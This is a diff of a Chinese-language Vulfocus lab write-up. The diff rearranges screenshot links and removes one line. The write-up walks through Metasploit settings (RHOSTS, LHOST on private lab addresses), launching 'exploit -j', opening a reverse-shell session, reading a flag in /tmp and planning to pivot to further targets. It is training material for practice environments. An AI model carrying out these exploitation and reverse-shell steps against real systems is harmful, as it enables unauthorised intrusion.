@@ -88,17 +88,13 @@ set RHOSTS 192.168.70.4
 set rport <your_port>
 set LHOST 192.168.70.7
 ```
-![](./images/使用options去查看payload的参数.png)
-![](./images/指定lhost.png)
-![](./images/根据option修改host和port.png)
-
 * 这时exp参数已经设置完毕了，我们直接使用```exploit -j```进行攻击
+![](./images/根据option修改host和port.png)
 ![](./images/开始攻击第一个靶机看到1session%20open，攻击成功.png)
 **看到 shell seeion1 open，攻击成功**
 * 这时我们用```seeions -l``` 查看一下session, 并且使用```sessions -i 1```进入session
 **在/tem 目录下执行ls -la，可以看到flag**
 ![](./images/利用第一个靶机的反弹shell拿到第一个flag.png)
-* 提交到vulfocus中就可以了
 ![](./images/第一个flag提交完毕.png)
 ### 立足第一个靶机发现第二到四个靶标
 **由于我们拿到了第一个反弹shell，在metasploit中我们可以升级这个shell**
